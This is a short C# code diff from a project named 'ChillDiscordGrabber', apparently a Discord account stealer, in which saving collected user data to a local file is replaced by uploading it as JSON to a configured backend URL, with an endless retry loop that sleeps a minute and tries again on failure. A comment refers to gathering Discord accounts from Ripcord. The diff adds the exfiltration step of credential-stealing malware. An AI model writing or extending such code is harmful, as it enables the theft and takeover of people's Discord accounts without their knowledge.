@@ -42,8 +42,18 @@ namespace ChillDiscordGrabber
 
 
             //To implement uploading the data to a backend
-            File.WriteAllText("out.json", JsonConvert.SerializeObject(user));
-
+            //File.WriteAllText("out.json", JsonConvert.SerializeObject(user));
+            Upload:
+            try
+            {
+                UploadData.PostUpload(JsonConvert.SerializeObject(user), $"{Settings.BackendUrl}/upload");
+            }
+            catch
+            {
+                GC.Collect(0);
+                Thread.Sleep(60000);
+                goto Upload;
+            }
         }
 
         //Atm is tested when Ripcord only has discord accounts
